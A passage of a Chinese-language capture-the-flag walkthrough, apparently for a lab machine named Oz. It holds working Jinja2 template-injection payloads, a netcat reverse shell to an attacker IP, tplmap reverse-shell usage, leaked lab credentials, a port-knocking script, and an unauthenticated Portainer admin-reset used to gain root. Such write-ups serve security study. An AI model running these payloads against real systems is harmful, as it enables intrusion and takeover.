     PREFERRED_URL_SCHEME: http
     JSONIFY_PRETTYPRINT_REGULAR: False
     TESTING: False
     PERMANENT_SESSION_LIFETIME: datetime.timedelta(31)
     TEMPLATES_AUTO_RELOAD: None
     TRAP_BAD_REQUEST_ERRORS: None
     JSON_SORT_KEYS: True
     JSONIFY_MIMETYPE: application/json
     SQLALCHEMY_MAX_OVERFLOW: None
     SESSION_COOKIE_HTTPONLY: True
     SEND_FILE_MAX_AGE_DEFAULT: datetime.timedelta(0
     43200)
     PRESERVE_CONTEXT_ON_EXCEPTION: None
     SESSION_REFRESH_EACH_REQUEST: True
     TRAP_HTTP_EXCEPTIONS: False}>
我们先通过写入配置，然后调用RUNCMD执行命令
分别按顺序执行下面3条命令
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_outputnnRUNCMD = check_outputn') }} # 写如配置文件
    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # 加载配置文件
    {{ config['RUNCMD']('whoami',shell=True) }} # 执行命令
使用kali nc -nlvp 4444接收shell
再通过burp弹shell
    {{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[-2].popen('nc 10.10.14.2 4444 -e /bin/sh').read()}}
我们还可以用tplmap，来执行ssti命令
git clone   
python tplmap.py -u ‘‘ -X POST -d
‘name=*&desc=anything’ -c
‘token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU0NzY1MzA2MX0.YEkK6t08h6aU-e2qH5sCa0OuQ09p4ScenD7_ZgkBTGY’
—reverse-shell 10.10.15.75 4444
查看containers/database/start.sh文件
cat start.sh
    /containers/database # cat start.sh
    #!/bin/bash
    docker run -d -v /connect/mysql:/var/lib/mysql --name ozdb 
    --net prodnet --ip 10.100.10.4 
    -e MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss 
    -e MYSQL_USER=dorthi 
    -e MYSQL_PASSWORD=N0Pl4c3L1keH0me 
    -e MYSQL_DATABASE=ozdb 
    -v /connect/sshkeys:/home/dorthi/.ssh/:ro 
    -v /dev/null:/root/.bash_history:ro 
    -v /dev/null:/root/.ash_history:ro 
    -v /dev/null:/root/.sh_history:ro 
    --restart=always 
    mariadb:5.5
在根目录ls -al看到一个文件.secret
我们打开进去看/.secret/knockd.conf
knockd
主要的目的是希望可以动态的修改防火墙规则，如果在15秒内按顺序联系udp端口40809,50212和46969，则在接下来的10秒内，防火墙将在端口22上打开。
    /.secret # cat knockd.conf
    [options]
        logfile = /var/log/knockd.log
    [opencloseSSH]
        sequence    = 40809:udp,50212:udp,46969:udp
        seq_timeout    = 15
        start_command    = ufw allow from %IP% to any port 22
        cmd_timeout    = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags    = syn
写一个bash脚本，在15秒内按顺序执行。然后ssh端口打开后，直接用密钥链接。
然后直接输入密码N0Pl4c3L1keH0me 登陆成功
    #!/bin/bash
    ports="40809 50212 46969"
    for port in $ports; do 
        echo "[*] Knocking on ${port}"
        echo "a" | nc -u -w 1 10.10.10.96 ${port}
        sleep 0.1
    done; 
    echo "[*] Knocking done."
    echo "[*] Password:"
    echo "N0Pl4c3L1keH0me"
    ssh -i ~/id_rsa PI:EMAIL
## docker
这时候查看一下根目录，发现user.txt
然后看一下sudo -l 显示出自己（执行 sudo 的使用者）的权限
我们可以运行两条docker命令
/usr/bin/docker network inspect *
/usr/bin/docker network ls
查看docker网络
sudo /usr/bin/docker network ls
我们可以看到两个桥接网络 bridge
网桥网络是一种可用于将某些docker主机与其他docker主机隔离的网络。从[docker](https://docs.docker.com/network/bridge/)文档：
就Docker而言，桥接网络使用软件桥接器，该软件桥接器允许连接到同一桥接网络的容器进行通信，同时提供与未连接到该桥接网络的容器的隔离。Docker桥驱动程序会自动在主机中安装规则，以便不同网桥上的容器无法直接相互通信。
    NETWORK ID          NAME                DRIVER              SCOPE
    2572cd5f4853        bridge              bridge              local
    49c1b0c16723        host                host                local
    3ccc2aa17acf        none                null                local
    48148eb6a512        prodnet             bridge              local
查看桥接的网络
sudo /usr/bin/docker network inspect bridge
172.17.0.2为Portainer实例，用于管理docker的UI
Portainer:
    dorthi@Oz:~$ sudo /usr/bin/docker network inspect bridge
    [
        {
            "Name": "bridge",
            "Id": "2572cd5f48539146fdbdffb021b995b4b2f62495be9c666efeb73eb88d2ef237",
            "Created": "2019-01-16T16:40:46.870486827-06:00",
            "Scope": "local",
            "Driver": "bridge",
            "EnableIPv6": false,
            "IPAM": {
                "Driver": "default",
                "Options": null,
                "Config": [
                    {
                        "Subnet": "172.17.0.0/16",
                        "Gateway": "172.17.0.1"
                    }
                ]
            },
            "Internal": false,
            "Attachable": false,
            "Containers": {
                "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                    "Name": "portainer-1.11.1",
                    "EndpointID": "fd4a166294c888d423f971bfa3e58e6bb15adcfa5542f524c15543abd0de3d36",
                    "MacAddress": "02:42:ac:11:00:02",
                    "IPv4Address": "172.17.0.2/16",
                    "IPv6Address": ""
                }
            },
            "Options": {
                "com.docker.network.bridge.default_bridge": "true",
                "com.docker.network.bridge.enable_icc": "true",
                "com.docker.network.bridge.enable_ip_masquerade": "true",
                "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
                "com.docker.network.bridge.name": "docker0",
                "com.docker.network.driver.mtu": "1500"
            },
            "Labels": {}
        }
    ]
通过查看Portainer文档，默认端口是9000
我们使用curl访问一下看，发现是存在的。
    dorthi@Oz:~$ curl http://172.17.0.2:9000/
      Portainer
由于kali无法直接访问172.17.0.2:9000
所以我们在靶机上执行反向代理操作。
然后就可以在kali实现访问172.17.0.2了
ssh -C -f -N -g -R 10.10.10.96:1234:172.17.0.2:9000
[PI:EMAIL](mailto:PI:EMAIL).75 -p 22
portainer API存在一个未授权访问的漏洞
我们看到上图是一个登陆界面，查找一下portainer api里面其中有一条初始化管理员账号密码的API
    http POST :9000/api/users/admin/init Username="admin" Password="admin"
我们尝试执行这个API
    dorthi@Oz:~$ http POST 172.17.0.2:9000/api/users/admin/init Username="admin" Password="admin"
    HTTP/1.1 200 OK
    Content-Length: 0
    Content-Type: text/plain; charset=utf-8
    Date: Thu, 17 Jan 2019 08:33:17 GMT
重置成功，使用admin/admin登陆
我们点击containers->add containers
然后填写相关的配置
点开test,找到console，选择/bin/sh,执行一下命令，拿到root.txt
## 参考